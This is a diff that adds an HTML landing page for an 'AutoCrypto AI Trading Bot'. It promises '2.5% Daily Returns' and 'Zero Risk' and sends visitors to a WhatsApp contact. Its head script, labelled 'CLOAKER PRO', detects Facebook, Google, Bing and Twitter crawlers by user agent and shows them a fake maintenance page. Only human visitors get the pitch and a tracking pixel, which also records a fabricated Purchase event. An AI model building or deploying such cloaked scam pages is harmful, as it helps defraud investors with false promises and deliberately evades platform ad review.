@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AutoCrypto - AI Crypto Trading Bot</title>
+    <script>
+    // CLOAKER PRO - DETECT FB BOT + IP
+    (function() {
+      const ua = navigator.userAgent;
+      const isBot = /FacebookExternalHit|Facebot|Googlebot|bingbot|Twitterbot/i.test(ua);
+      
+      if (isBot) {
+        document.documentElement.innerHTML = `
+          <!DOCTYPE html>
+          <html>
+          <head><title>Maintenance</title></head>
+          <body style="text-align:center;padding:50px;font-family:Arial">
+            <h1>🔧 AutoCrypto Platform</h1>
+            <p>Scheduled maintenance. Back online shortly.</p>
+            <p>Thank you for your patience.</p>
+          </body>
+          </html>`;
+        return;
+      }
+      
+      // HUMAN OK → PIXEL + LANDING
+      !function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+      n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;
+      n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;
+      t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,
+      document,'script','https://connect.facebook.net/en_US/fbevents.js');
+      fbq('init', 'PIXEL_ID_HNA'); fbq('track', 'PageView');
+    })();
+    </script>
+    <style>
+    /* TON CSS PRO ICI */
+    body { font-family: 'Segoe UI', sans-serif; margin:0; background:linear-gradient(135deg,#667eea 0%,#764ba2 100%); }
+    .hero { max-width:1200px;margin:0 auto;padding:100px 20px;text-align:center;color:white; }
+    .btn { background:#ff6b6b;padding:15px 40px;border:none;border-radius:50px;font-size:18px;cursor:pointer; }
+    </style>
+</head>
+<body>
+    <div class="hero">
+        <h1>🚀 AutoCrypto AI Trading Bot</h1>
+        <p>2.5% Daily Returns • Ex-Binance • Zero Risk</p>
+        <button class="btn" onclick="startTrading()">Start VIP Trading →</button>
+        
+        <div style="margin-top:80px">
+            <img src="https://via.placeholder.com/800x400/667eea/ffffff?text=Live+Stats+2.5%+Today" alt="Stats">
+        </div>
+    </div>
+    
+    <script>
+    function startTrading() {
+        fbq('track', 'Purchase', {value: 99, currency: 'USD'});
+        window.location = 'https://wa.me/212XXXXXXXXX?text=AutoCrypto+VIP';
+    }
+    </script>
+</body>
+</html>
